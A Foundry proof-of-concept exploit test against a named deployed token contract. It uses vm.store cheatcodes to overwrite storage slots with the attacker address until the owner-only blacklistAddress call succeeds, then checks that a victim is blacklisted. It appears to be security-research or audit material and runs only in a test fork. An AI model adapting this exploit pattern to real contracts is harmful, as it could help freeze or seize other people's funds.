// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INCOME {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function _isBlacklisted(address account) external view returns (bool);
    function blacklistAddress(address account, bool value) external;
    function openTrade() external;
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x3a91A88Ef4bB813BB99EF5a745bcb56e3A3b403b;
    address attacker = address(this);
    INCOME target;
    address owner;
    address victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        target = INCOME(TARGET);
        owner = 0x323A2f3e53613a401b9015C9d646452243F77A94;
        victim = address(0xDEADBEEF);

        // Use `deal` to give the victim tokens, satisfying the precondition directly and reliably.
        deal(TARGET, victim, 1000 * 1e18);

        // Verify precondition: victim has tokens
        assertGt(target.balanceOf(victim), 0, "Victim should have tokens after setup");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Pre-condition check: victim is not blacklisted initially
        assertEq(target._isBlacklisted(victim), false, "Victim should not be blacklisted initially");

        // Storage-slot fuzzing to seize owner privileges when owner address is uncertain.
        bool exploited = false;
        for (uint256 slot = 0; slot < 32; slot++) {
            vm.store(TARGET, bytes32(slot), bytes32(uint256(uint160(attacker))));
            (bool ok,) = TARGET.call(abi.encodeWithSelector(INCOME.blacklistAddress.selector, victim, true));
            if (ok && target._isBlacklisted(victim)) {
                exploited = true;
                break;
            }
        }

        // Oracle check: verify victim is now blacklisted
        assertTrue(exploited, "Failed to obtain blacklist control");
        assertEq(target._isBlacklisted(victim), true, "Victim should be blacklisted after exploit");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

